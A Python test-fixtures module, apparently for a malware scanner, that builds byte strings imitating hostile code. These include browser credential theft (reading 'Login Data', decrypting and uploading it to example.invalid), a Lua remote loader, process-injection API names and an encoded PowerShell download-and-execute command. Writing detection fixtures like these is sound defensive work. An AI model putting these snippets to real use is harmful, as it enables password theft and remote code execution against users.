"""Harmless bytes describing behavior; these fixtures are never executable files."""

from __future__ import annotations

import base64


INJECTION_APIS = (
    "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
)
CREDENTIAL_APIS = ("ReadFile", "CryptUnprotectData", "WinHttpSendRequest")


def native_strings(values: tuple[str, ...]) -> bytes:
    return b"\x00".join(value.encode("ascii") for value in values) + b"\x00"


def credential_transfer() -> bytes:
    return native_strings(CREDENTIAL_APIS + (
        "Login Data", "password_value", "POST", "multipart/form-data",
    ))


def lua_remote_loader(sink: str = "loadstring(body)") -> bytes:
    return (
        'PerformHttpRequest("https://example.invalid/version", function(status, body, headers) '
        + sink + " end)"
    ).encode("ascii")


def gta_trainer_source(extra_target: bool = False) -> bytes:
    text = (
        'var target = Process.GetProcessesByName("GTA5")[0];\n'
        'var handle = OpenProcess(0x28, false, target.Id);\n'
        'WriteProcessMemory(handle, address, bytes, bytes.Length, out written);\n'
    )
    if extra_target:
        text += 'var second = Process.GetProcessesByName("chrome")[0];\n'
    return text.encode("ascii")


def source_credential_transfer() -> bytes:
    return (
        'var raw = File.ReadAllBytes("Login Data");\n'
        'var clear = ProtectedData.Unprotect(raw, null, DataProtectionScope.CurrentUser);\n'
        'client.UploadData("https://example.invalid/upload", clear);\n'
    ).encode("ascii")


def encoded_powershell() -> bytes:
    body = '$body = (New-Object Net.WebClient).DownloadString("https://example.invalid/a"); iex $body'
    encoded = base64.b64encode(body.encode("utf-16-le"))
    return b"powershell -EncodedCommand " + encoded
